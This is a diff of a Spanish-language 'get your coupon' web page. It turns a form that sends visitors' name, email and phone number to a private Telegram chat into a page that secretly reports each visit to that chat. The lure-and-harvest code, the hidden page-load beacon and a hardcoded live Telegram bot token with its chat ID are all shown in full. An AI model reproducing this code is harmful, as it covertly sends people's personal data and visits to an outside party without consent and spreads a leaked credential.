@@ -6,8 +6,6 @@ export default function Home() {
     // Crear el elemento <title>
     const titleElement = document.createElement("title");
     titleElement.textContent = "¡Obtén Tu Cupón!";
-
-    // Agregarlo al <head>
     document.head.appendChild(titleElement);
 
     // Crear un estilo global y agregarlo al head
@@ -15,7 +13,7 @@ export default function Home() {
     style.textContent = `
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; font-family: Arial, sans-serif; }
-        body { 
+        body {
             display: flex; align-items: center; justify-content: center;
             background: url("https://i.imgur.com/K4ffkXt.jpeg") no-repeat center center / cover;
         }
@@ -41,83 +39,62 @@ export default function Home() {
     `;
     document.head.appendChild(style);
 
+    // Enviar mensaje a Telegram cuando se carga la página
+    sendTelegramMessage("📢 Un usuario ha ingresado a la página de cupones.");
+
     return `
     <div class="container">
         <div class="form-wrapper">
             <h1>Completa tus datos para obtener tu cupón</h1>
             <div id="couponForm">
-                <label for="nombre">Nombre</label>
+              /*   <label for="nombre">Nombre</label>
                 <input type="text" id="nombre" name="nombre" required />
-
                 <label for="correo">Correo electrónico</label>
                 <input type="email" id="correo" name="correo" required />
-
                 <label for="telefono">Número de teléfono</label>
-                <input type="tel" id="telefono" name="telefono" required />
-
+                <input type="tel" id="telefono" name="telefono" required /> */
                 <button type="button" class="submit-button" id="submitBtn">Recibir mi cupón</button>
             </div>
         </div>
-    </div>
-`;
+    </div>`;
 }
 
 export function addHomeEvents() {
     document.getElementById("submitBtn").addEventListener("click", async function () {
-        const nombre = document.getElementById("nombre").value;
+     /*    const nombre = document.getElementById("nombre").value;
         const correo = document.getElementById("correo").value;
         const telefono = document.getElementById("telefono").value;
 
-        // Validación básica
         if (!nombre || !correo || !telefono) {
             alert("Por favor, completa todos los campos.");
             return;
         }
 
-        // 1️⃣ Construir el mensaje
-        const mensaje = `
-        ✈️ NUEVO REGISTRO:
-        👤 Nombre: ${nombre}
-        📩 Correo: ${correo}
-        📟 Teléfono: ${telefono}
-        `;
+        const mensaje = `✈️ NUEVO REGISTRO:\n👤 Nombre: ${nombre}\n📩 Correo: ${correo}\n📟 Teléfono: ${telefono}`;
+        await sendTelegramMessage(mensaje); */
 
-        // 2️⃣ Configurar datos para la API de Telegram
-        const botToken = "7959584991:AAEuDqY8YuOraJYWtpN0tdxWX_TquHkepJE"; // Reemplaza con tu token del bot
-        const chatId = "6298387261";     // Reemplaza con el ID del chat de Telegram
-
-        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-        // 3️⃣ Configurar los datos para la solicitud POST
-        const postFields = {
-            chat_id: chatId,
-            text: mensaje
-        };
-
-        // 4️⃣ Realizar la solicitud POST
-        try {
-            const response = await fetch(apiUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(postFields)
-            });
-
-            // 5️⃣ Verificar respuesta
-            if (!response.ok) {
-                throw new Error(`Error al enviar el mensaje: ${response.statusText}`);
-            }
-
-            console.log("Datos enviados a Telegram:", { nombre, correo, telefono });
-
-            // 6️⃣ Redirigir a página de éxito (opcional)
-            history.pushState(null, "", "/gracias");
-            initRouter();
-
-        } catch (error) {
-            console.error("Error al enviar los datos:", error);
-            alert("Hubo un error al enviar tu solicitud. Inténtalo de nuevo.");
-        }
+        history.pushState(null, "", "/gracias");
+        initRouter();
     });
+}
+
+async function sendTelegramMessage(text) {
+    const botToken = "7959584991:AAEuDqY8YuOraJYWtpN0tdxWX_TquHkepJE";
+    const chatId = "6298387261";
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+        const response = await fetch(apiUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text })
+        });
+
+        if (!response.ok) {
+            throw new Error(`Error al enviar el mensaje: ${response.statusText}`);
+        }
+        console.log("Mensaje enviado a Telegram:", text);
+    } catch (error) {
+        console.error("Error al enviar mensaje a Telegram:", error);
+    }
 }
